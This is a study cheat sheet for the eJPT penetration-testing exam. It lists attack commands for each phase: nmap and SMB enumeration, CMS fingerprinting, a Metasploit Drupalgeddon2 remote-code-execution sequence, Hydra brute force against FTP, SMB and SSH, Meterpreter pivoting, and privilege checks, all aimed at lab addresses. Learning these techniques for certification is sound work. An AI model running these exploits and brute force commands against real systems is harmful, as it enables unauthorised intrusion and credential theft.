Cheat Sheet

This cheat sheet is a list of commands to help with the eJPT.

*** FOR A DEEP DIVE REFER TO: ***

----------------------------------------------------------------------------------------------------------------------
Phase 1: Deep Discovery & Network Mapping
Host Discovery
Identify live hosts using ARP discovery or ICMP sweeps.

# ARP Scan
netdiscover -r 10.11.12.0/24 

# ICMP/Ping Sweep
fping -a -g 10.11.12.0/24 2>/dev/null | tee scans.txt
Nmap Mastery
Comprehensive scanning for ports, services, and OS versions.

# Aggressive Full Port Scan
nmap -sV -sC -O -A -p- -T4 10.11.12.13

# Filter results for specific Windows versions
grep -i "windows server xxxx" full_scan.txt

# Add virtual hosts
sudo nano /etc/hosts
# Format: 10.11.12.13  wordpress.local

Phase 2: SMB & RPC Enumeration
Share Enumeration
Check for accessible files and directories.

# List shares anonymously (Null Session)
smbclient -L //10.11.12.13 -N

# Map permissions for a specific user
smbmap -H 10.11.12.13 -u user -p "password123"

# Comprehensive Windows enumeration
enum4linux -a 10.11.12.13

# Connect to a specific share
smbclient //10.11.12.13/Users -U user


Phase 3: Web Application & CMS Exploitation
WordPress & Drupal
Fingerprinting and user enumeration for specific CMS platforms.

# Inspect HTTP headers
curl -I http://10.11.12.13/wp-login.php

# Enumerate WP users and plugins
wpscan --url http://wordpress.local --enumerate u,vp

# Drupal Version Identification
curl http://10.11.12.13/drupal/CHANGELOG.txt

# Start Framework
msfconsole

# Drupalgeddon2 RCE (Example)
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 10.11.12.13
set LHOST tun0
set TARGETURI /drupal/
run


Phase 4: Password Cracking (Hydra)
Network Brute Force
Automated login attempts against standard protocols.

# FTP Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt 10.11.12.13 ftp

# SMB Brute Force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.12.13 smb

# SSH Brute Force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.12.13 ssh


Phase 5: Remote Access & SQL
RDP (Remote Desktop)

# Standard Connection
xfreerdp /u:admin /p:xyz /v:10.11.12.13 /cert-ignore

# Enhanced Connection (Clipboard & Dynamic Res)
xfreerdp /v:10.11.12.13 /u:admin /p:xyz /dynamic-resolution +clipboard /cert-ignore

# Remote Login
mysql --user=root --port=13306 -p -h 10.11.12.13

# Database Queries
SHOW databases;
use <db_name>;
SELECT * FROM <table_name>;

Phase 6: Pivoting & Internal Enumeration
Routing & Connections

# View routing tables
ip route
route print

# Check active ports
netstat -tulpn # Linux
netstat -ano   # Windows

# Manual Linux Route
sudo ip route add 10.10.10.0/24 via 10.11.12.13

# Add internal route
meterpreter > route add 172.16.1.0 255.255.255.0 1


Phase 7: Post-Exploitation & PrivEsc
Privilege & System Checks

# Check Windows Privs
whoami /priv

# Linux Hash Algorithm Check
grep "ENCRYPT_METHOD" /etc/login.defs

# Locate flags
dir C:\Users\mike\Documents\flag.txt
cat /home/auditor/flag.txt
